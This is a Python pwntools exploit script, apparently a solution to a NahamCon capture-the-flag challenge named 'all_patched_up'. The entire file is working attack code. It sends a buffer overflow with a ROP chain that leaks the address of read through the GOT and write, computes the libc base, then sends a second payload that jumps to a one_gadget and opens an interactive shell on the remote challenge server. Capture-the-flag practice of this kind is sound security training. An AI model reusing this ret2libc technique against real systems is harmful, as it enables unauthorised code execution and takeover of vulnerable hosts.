#!/usr/bin/env python3
# -*- coding:utf-8 -*

from pwn import *
from sys import argv
from time import sleep


context.terminal = ['tmux', 'sp', '-h']
context.log_level = "debug"

chall = "./all_patched_up"
libc = ELF("./libc.so.6")
elf = ELF(chall)
context.binary = chall
context.binary.checksec()

if len(argv) >= 2 and argv[1] == "r":
    p = remote("challenge.nahamcon.com", 30064)
elif len(argv) >= 2 and argv[1] == "d":
	cmd = """
		#b *main+57
		b *main+68
		c
	"""
	p = gdb.debug(chall,cmd)
else:
    p = process(chall)


rop_pop_rsi_pop_r15_mov_rdi_1_ret = 0x00401251
rop_pop_r12_r13_r14_r15_mov_rdi_1_ret = 0x0040124c

payload = b"A" * 512
payload += b"B" * 8# saved rbp
payload += p64(rop_pop_rsi_pop_r15_mov_rdi_1_ret)
payload += p64(elf.got["read"])
payload += p64(0xdeadbeefcafebabe)
payload += p64(elf.plt["write"])
payload += p64(elf.symbols["main"])

p.recvuntil(">")
p.send(payload)

p.recvuntil(b'\x20')

read_libc_addr = u64(p.recv(8))
log.info("read@libc: " + hex(read_libc_addr))
libc_base = read_libc_addr - libc.symbols["read"]
libc.address = libc_base
log.info("libc base: " + hex(libc_base))
one_gadget_off = 0xe3afe
one_gadget_addr = libc_base + one_gadget_off

payload = b"A" * 512
payload += b"B" * 8# saved rbp
payload += p64(rop_pop_r12_r13_r14_r15_mov_rdi_1_ret)
payload += p64(0) * 4
payload += p64(one_gadget_addr)

sleep(0.5)
p.send(payload)

p.interactive()
